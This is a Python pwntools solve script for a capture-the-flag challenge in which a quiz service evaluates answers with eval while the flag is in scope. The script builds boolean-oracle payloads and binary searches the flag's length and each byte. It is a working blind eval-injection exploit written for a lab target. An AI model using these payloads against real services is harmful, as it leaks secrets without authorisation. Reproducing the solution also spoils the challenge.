from pwn import *

# running on local machine
# replace this with remote url
# p = process(['python3', 'physics-test.py'])
p = remote('localhost', 8148)

# answers for each of the problems
answers = [
    (b"A box", "x*y*y/2"),
    (b"A spring", "x*y"),
    (b"A red ball", "(x+2*y)/3")
]

# Putting some random spam into the input,
# we get an error message which shows this snippet of code:
# res = eval(answer, {'__builtins__': None}, {'x': x, 'y': y, 'flag': flag})
# We can see that the flag is being passed to the eval function
# From each question, we get one bit of data, based on whether
# our input is equivalent to the expected output or not
# So, we can design our input so that it equals the correct
# output only when some certain thing about our flag is true.

# First, we get the flag length with binary search
# (We see that len and ord are allowed, but = is not)
# so it encourages binary search
f_len_min = 0
f_len_max = 100
while f_len_min != f_len_max:
    guess = (f_len_min + f_len_max) // 2

    line = p.recvline_contains(b"Question")
    print(line)
    # We look up the question to find the appropriate answer
    for (q, ans) in answers:
        if q in line:
            payload = f"(-1,{ans})[len(flag)>{guess}]".encode()
            print(payload)
            # Note that the way this payload works,
            # this will evaluate to the correct answer if and only if
            # len(flag) > guess (if not, it will evaluate to -1)
            # Thus we can determine this info about the flag based on
            # whether the output is "TEST FAILED!" or "Good job!"
            p.sendlineafter(b"Answer: ", payload)
            break
    line = p.recvline_contains(b"!")
    print(line)
    if b"Good job!" in line:
        f_len_min = guess + 1
    else:
        f_len_max = guess
    print(f_len_min, f_len_max)
    # p.interactive()

# We now have our length
# Now we binary search to get each byte of the flag one at a time, same thing
f_len = f_len_min
flag = ""

for i in range(f_len):
    char_min = 0
    char_max = 256
    while char_min != char_max:
        guess = (char_min + char_max) // 2

        line = p.recvline_contains(b"Question")
        print(line)
        for (q, ans) in answers:
            if q in line:
                payload = f"(-1,{ans})[ord(flag[{i}])>{guess}]".encode()
                p.sendlineafter(b"Answer: ", payload)
                break
        line = p.recvline_contains(b"!")
        print(line)
        if b"Good job!" in line:
            char_min = guess + 1
        else:
            char_max = guess
    flag += chr(char_min)
    print(flag)